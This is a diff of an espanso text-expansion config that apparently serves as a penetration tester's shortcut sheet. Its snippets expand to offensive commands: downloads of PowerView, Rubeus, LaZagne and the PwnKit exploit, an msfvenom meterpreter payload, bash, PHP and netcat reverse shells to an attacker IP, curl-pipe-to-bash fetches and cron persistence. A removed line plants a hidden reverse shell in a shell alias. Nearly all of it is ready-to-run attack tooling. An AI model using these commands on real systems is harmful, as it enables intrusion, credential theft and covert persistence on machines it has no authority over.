@@ -40,7 +40,7 @@ matches:
       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
       wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
       wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
-      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit & 
+      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit &
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &
       wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &
@@ -58,19 +58,19 @@ matches:
   - trigger: ":msfmlin"
     replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=22 -f elf -o shell.elf LHOST=
 
-  - trigger: ":smb"
+  - trigger: ":smbserver"
     replace: "impacket-smbserver -smb2support share ."
 
   - trigger: ":pyserver"
     replace: "python3 -m http.sever "
   
   - trigger: ":phpserver"
-    replace: "php -S 0.0.0.0:"                                                  
+    replace: "php -S 0.0.0.0:"
                                                                                 
-  - trigger: ":responder"                                                       
-    replace: "sudo responder -I tun0"                                           
-                                                                                
-  - trigger: ":nc"                                                              
+  - trigger: ":responder"
+    replace: "sudo responder -I tun0"
+    
+  - trigger: ":nc"
     replace: nc -nvlp 22
 
 # ENUMERATION
@@ -87,12 +87,17 @@ matches:
     replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u "
 
 # REVERSE SHELLS                                                                
-  # LINUX                                                                       
+  # LINUX
+  - trigger: ":rbash"
+    replace: "bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"
+
+  - trigger: ":rphp"
+    replace: <?php shell_exec("bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"); ?>
   - trigger: ":rcurl"                                                           
-    replace: curl http://{{IP}}/shell.sh | bash                                 
+    replace: curl http://{{IP}}/shell.sh | bash
                                                                                 
   - trigger: ":rwget"                                                           
-    replace: wget http://192.168.174.150/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh                                                                        
+    replace: wget http://192.168.174.150/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
 
   - trigger: ":mkfifo"                                                          
     replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 22 >/tmp/f
@@ -125,9 +130,6 @@ matches:
       
   - trigger: ":cronpersist"
     replace: crontab -l | { cat; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"; } | crontab -
-
-  - trigger: ":aliaspersist"
-    replace: echo "alias cat='(bash -i >& /dev/tcp/{{IP}}/22 0>&1 & disown) 2>/dev/null; cat'" | tee -a ~/.bashrc ~/.zshrc
 
   - trigger: ":wget"
     replace: wget http://{{IP}}/
